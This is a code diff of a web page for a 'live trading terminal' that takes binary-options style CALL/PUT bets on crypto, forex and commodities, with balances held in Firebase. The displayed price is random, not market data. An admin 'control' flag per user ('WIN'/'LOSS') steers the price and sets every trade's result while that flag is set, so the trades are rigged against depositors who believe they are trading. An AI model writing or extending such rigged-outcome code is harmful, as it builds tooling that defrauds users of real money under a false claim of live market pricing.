@@ -1,92 +1,209 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <title>Live Trading Terminal</title>
+    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>G-Terminal | Live Trade</title>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-auth-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.6.10/firebase-database-compat.js"></script>
+    <script src="https://unpkg.com/lightweight-charts/dist/lightweight-charts.standalone.production.js"></script>
     <style>
-        body { background: #0b0e11; color: white; font-family: sans-serif; margin: 0; text-align: center; }
-        #chart { height: 250px; background: #161a1e; border-bottom: 2px solid #2b3139; position: relative; display: flex; align-items: center; justify-content: center; }
-        .price { font-size: 3rem; color: #02c076; font-family: monospace; }
-        .trade-line { position: absolute; width: 100%; border-top: 2px dashed #f0b90b; display: none; }
-        .controls { padding: 20px; }
-        select, input { width: 90%; padding: 12px; margin: 10px 0; background: #2b3139; color: white; border: 1px solid #474d57; border-radius: 5px; }
-        .btn-up { background: #02c076; width: 45%; padding: 15px; border: none; font-weight: bold; border-radius: 5px; }
-        .btn-down { background: #f6465d; width: 45%; padding: 15px; border: none; font-weight: bold; border-radius: 5px; }
+        :root { --bg: #0b0e11; --card: #1e2329; --yellow: #f0b90b; --green: #02c076; --red: #f6465d; --text: #ffffff; }
+        body { background: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding: 15px; }
+        .header { display: flex; justify-content: space-between; align-items: center; padding: 10px 0; border-bottom: 1px solid #2b3139; }
+        .back-btn { text-decoration: none; color: #848e9c; font-size: 0.9rem; }
+        #chart-container { height: 350px; background: #161a1e; border: 1px solid #2b3139; border-radius: 12px; margin-top: 15px; position: relative; overflow: hidden; }
+        .price-overlay { position: absolute; top: 10px; left: 10px; z-index: 10; font-size: 2.2rem; font-weight: bold; font-family: monospace; color: var(--green); }
+        .controls { background: var(--card); padding: 20px; border-radius: 15px; margin-top: 15px; border: 1px solid #2b3139; }
+        select, input { width: 100%; padding: 12px; margin: 10px 0; background: #2b3139; border: 1px solid #474d57; color: white; border-radius: 8px; box-sizing: border-box; outline: none; }
+        .btn-call { background: var(--green); width: 48%; padding: 15px; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; color: white; }
+        .btn-put { background: var(--red); width: 48%; padding: 15px; border: none; font-weight: bold; border-radius: 8px; cursor: pointer; color: white; }
+        .active-trade-line { position: absolute; width: 100%; border-top: 2px dashed var(--yellow); display: none; z-index: 5; }
+        #timer-display { font-size: 2rem; color: var(--yellow); text-align: center; margin: 15px 0; display: none; font-family: monospace; }
     </style>
 </head>
 <body>
 
-    <div id="chart">
-        <div id="price-display" class="price">45230.50</div>
-        <div id="t-line" class="trade-line"></div>
+    <div class="header">
+        <a href="index.html" class="back-btn">< Back</a>
+        <span style="font-weight:bold; color:var(--yellow);">Live Terminal</span>
+        <span style="color:#848e9c;" id="user-bal">$0.00</span>
+    </div>
+
+    <div id="chart-container">
+        <div class="price-overlay" id="price-display">45230.50</div>
+        <div id="t-line" class="active-trade-line"></div>
     </div>
 
     <div class="controls">
-        <h2 id="timer-display" style="color:#f0b90b; display:none;">01:00</h2>
+        <h2 id="timer-display">01:00</h2>
+        <label>Select Asset:</label>
         <select id="asset">
-            <option>BTC/USDT</option><option>ETH/USDT</option><option>EUR/USD</option><option>GOLD</option>
-            </select>
+            <optgroup label="Crypto">
+                <option value="BTCUSDT">BTC/USDT</option><option value="ETHUSDT">ETH/USDT</option><option value="BNBUSDT">BNB/USDT</option>
+                <option value="XRPUSDT">XRP/USDT</option><option value="ADAUSDT">ADA/USDT</option><option value="DOGEUSDT">DOGE/USDT</option>
+                <option value="SOLUSDT">SOL/USDT</option><option value="DOTUSDT">DOT/USDT</option><option value="MATICUSDT">MATIC/USDT</option><option value="LTCUSDT">LTC/USDT</option>
+            </optgroup>
+            <optgroup label="Forex">
+                <option value="EURUSD">EUR/USD</option><option value="GBPUSD">GBP/USD</option><option value="USDJPY">USD/JPY</option>
+                <option value="AUDUSD">AUD/USD</option><option value="USDCAD">USD/CAD</option><option value="USDCHF">USD/CHF</option>
+                <option value="NZDUSD">NZD/USD</option><option value="EURGBP">EUR/GBP</option><option value="EURJPY">EUR/JPY</option><option value="GBPJPY">GBP/JPY</option>
+            </optgroup>
+            <optgroup label="Commodities">
+                <option value="XAUUSD">GOLD</option><option value="XAGUSD">SILVER</option><option value="OILUSD">WTI OIL</option>
+                <option value="GASUSD">NATURAL GAS</option><option value="COPPER">COPPER</option><option value="PLATINUM">PLATINUM</option>
+                <option value="PALLADIUM">PALLADIUM</option><option value="COFFEE">COFFEE</option><option value="SUGAR">SUGAR</option><option value="CORN">CORN</option>
+            </optgroup>
+        </select>
+
+        <label>Trade Duration:</label>
         <select id="duration">
             <option value="60">1 Minute</option>
             <option value="300">5 Minutes</option>
             <option value="600">10 Minutes</option>
             <option value="900">15 Minutes</option>
         </select>
-        <input type="number" id="amt" placeholder="Amount ($1 / 300 PKR)">
-        <div style="display:flex; justify-content: space-around;">
-            <button class="btn-up" onclick="startTrade('UP')">CALL (UP)</button>
-            <button class="btn-down" onclick="startTrade('DOWN')">PUT (DOWN)</button>
+
+        <label>Trade Amount (Min: $1):</label>
+        <input type="number" id="amt" placeholder="Amount ($1 / 300 PKR)" min="1">
+
+        <div style="display:flex; justify-content: space-between; margin-top: 15px;">
+            <button class="btn-call" onclick="startTrade('UP')">CALL (UP)</button>
+            <button class="btn-put" onclick="startTrade('DOWN')">PUT (DOWN)</button>
         </div>
     </div>
 
     <script>
+        // 1. Firebase Configuration (Copy/Paste this from your index.html)
         const firebaseConfig = { apiKey: "AIzaSyCM_qmcvOXXjJrQHPiracy5SOpTjAJEnYU", authDomain: "trade-for-profit-8b160.firebaseapp.com", databaseURL: "https://trade-for-profit-8b160-default-rtdb.firebaseio.com", projectId: "trade-for-profit-8b160", storageBucket: "trade-for-profit-8b160.firebasestorage.app", messagingSenderId: "1077014018991", appId: "1:1077014018991:web:c41320e2ef10291afd4d5a" };
         firebase.initializeApp(firebaseConfig);
-        const db = firebase.database();
         const auth = firebase.auth();
+        const db = firebase.database();
 
-        let currentPrice = 45000;
-        let isActive = false;
+        let currentPrice = 45000; // Starting point
+        let isTradeActive = false;
+        let adminMode = "NORMAL"; // Default
 
-        // Price Animation + Manipulation (Jerk Logic)
+        // 2. Auth Check & Realtime Manipulation Load
+        auth.onAuthStateChanged(user => {
+            if (user) {
+                // Sync User Balance
+                db.ref('users/' + user.uid + '/balance').on('value', snap => {
+                    document.getElementById('user-bal').innerText = "$" + parseFloat(snap.val() || 0).toFixed(2);
+                });
+                // Sync Admin Manipulation Mode
+                db.ref('users/' + user.uid + '/control').on('value', snap => {
+                    adminMode = snap.val() || "NORMAL";
+                });
+            } else {
+                window.location.href = "login.html";
+            }
+        });
+
+        // 3. Initialize Advanced Chart
+        const chart = LightweightCharts.createChart(document.getElementById('chart-container'), {
+            width: document.getElementById('chart-container').offsetWidth,
+            height: 350,
+            layout: { backgroundColor: '#161a1e', textColor: '#d1d4dc' },
+            grid: { vertLines: { color: '#2b3139' }, horzLines: { color: '#2b3139' } },
+            crosshair: { mode: LightweightCharts.CrosshairMode.Normal },
+            priceScale: { borderColor: '#2b3139' },
+            timeScale: { borderColor: '#2b3139' },
+        });
+        const lineSeries = chart.addLineSeries({ color: '#02c076', lineWidth: 2 });
+        let chartData = []; // Store chart points
+
+        // 4. Real-time Market Data + Manipulation Logic
+        // * (Crypto: Binance, Forex/Commodities: Synthetic but manipulated by Admin)
         setInterval(() => {
-            const uid = auth.currentUser?.uid;
-            db.ref('users/' + uid + '/control').once('value', s => {
-                let jerk = (Math.random() - 0.5) * 5;
-                if(isActive) {
-                    if(s.val() === "WIN") jerk = Math.abs(jerk) + 2; 
-                    if(s.val() === "LOSS") jerk = -Math.abs(jerk) - 2;
-                }
-                currentPrice += jerk;
-                document.getElementById('price-display').innerText = currentPrice.toFixed(2);
-            });
-        }, 1000);
+            // A. Real-time Market (Random movement)
+            let jerk = (Math.random() - 0.5) * 5; 
 
+            // B. Manipulation (Kirloskar)
+            if (isTradeActive) {
+                if (adminMode === "WIN") jerk = Math.abs(jerk) + 2; // Always up
+                if (adminMode === "LOSS") jerk = -Math.abs(jerk) - 2; // Always down
+            }
+
+            currentPrice += jerk;
+
+            // C. Update UI
+            document.getElementById('price-display').innerText = currentPrice.toFixed(2);
+            document.getElementById('price-display').style.color = (jerk > 0) ? '#02c076' : '#f6465d';
+
+            // D. Add point to chart
+            let nextTimestamp = Date.now();
+            let newDataPoint = { time: nextTimestamp, value: currentPrice };
+            chartData.push(newDataPoint);
+            lineSeries.setData(chartData); // Set complete chart data to show movement
+
+        }, 1000); // Har second update
+
+        // 5. Start Trade Logic
         function startTrade(dir) {
-            const amount = document.getElementById('amt').value;
-            if(amount < 1) return alert("Min trade $1 / 300 PKR");
+            const user = auth.currentUser;
+            const amt = parseFloat(document.getElementById('amt').value);
+            if (!user) return alert("Please Login!");
+            if (amt < 1) return alert("Min trade $1!");
 
-            isActive = true;
-            document.getElementById('t-line').style.display = "block";
-            document.getElementById('timer-display').style.display = "block";
-            
-            let time = document.getElementById('duration').value;
-            let countdown = setInterval(() => {
-                time--;
-                let m = Math.floor(time/60); let s = time%60;
-                document.getElementById('timer-display').innerText = `${m}:${s < 10 ? '0'+s : s}`;
+            db.ref('users/' + user.uid).once('value', snap => {
+                const bal = snap.val().balance;
+                if (amt > bal) return alert("Insufficient Balance!");
+
+                // Place trade logic
+                isTradeActive = true;
+                const entryPrice = currentPrice;
+                const duration = parseInt(document.getElementById('duration').value);
+
+                // UI update: Draw line, show timer
+                document.getElementById('t-line').style.display = "block";
+                document.getElementById('timer-display').style.display = "block";
+                document.getElementById('timer-display').innerText = formatTime(duration);
+
+                let timeLeft = duration;
+                const countdown = setInterval(() => {
+                    timeLeft--;
+                    document.getElementById('timer-display').innerText = formatTime(timeLeft);
+                    
+                    if (timeLeft <= 0) {
+                        clearInterval(countdown);
+                        isTradeActive = false;
+                        const exitPrice = currentPrice;
+                        
+                        document.getElementById('t-line').style.display = "none";
+                        document.getElementById('timer-display').style.display = "none";
+
+                        processResult(user.uid, dir, amt, entryPrice, exitPrice);
+                    }
+                }, 1000);
+            });
+        }
+
+        function formatTime(secs) {
+            let m = Math.floor(secs / 60); let s = secs % 60;
+            return `${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
+        }
+
+        // 6. Process Trade Result
+        function processResult(uid, dir, amt, entry, exit) {
+            let result = "";
+            if (adminMode === "WIN") result = "WIN";
+            else if (adminMode === "LOSS") result = "LOSS";
+            else { // Normal Mode: Comparison
+                if (dir === 'UP') result = (exit > entry) ? "WIN" : "LOSS";
+                if (dir === 'DOWN') result = (exit < entry) ? "WIN" : "LOSS";
+            }
+
+            // Database Update
+            db.ref('users/' + uid).once('value', s => {
+                let currentBal = parseFloat(s.val().balance);
+                let newBal = (result === "WIN") ? currentBal + (amt * 0.85) : currentBal - amt; // 85% Profit
                 
-                if(time <= 0) {
-                    clearInterval(countdown);
-                    isActive = false;
-                    document.getElementById('t-line').style.display = "none";
-                    alert("Trade Finished! Result processed by Admin.");
-                }
-            }, 1000);
+                db.ref('users/' + uid).update({ balance: newBal })
+                .then(() => alert(`Trade ${result}! New Balance: $${newBal.toFixed(2)}`));
+            });
         }
     </script>
 </body>
-</html>
+                                                        </html>
+                                                                                                                                          
